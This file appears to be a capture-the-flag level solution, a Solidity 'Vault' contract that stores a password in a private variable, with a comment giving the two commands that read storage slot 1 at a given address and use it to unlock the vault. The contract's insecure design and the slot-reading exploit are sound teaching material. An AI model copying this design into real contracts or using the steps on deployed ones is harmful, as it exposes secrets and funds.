// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked; // 0 slot
  bytes32 private password; // 1 slot

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}

/*
1. let password = await web3.eth.getStorageAt("0x5c41eF65F565a55a35fdc452dCBF3341849C5eD8", 1)
2. await contract.unlock(password)
*/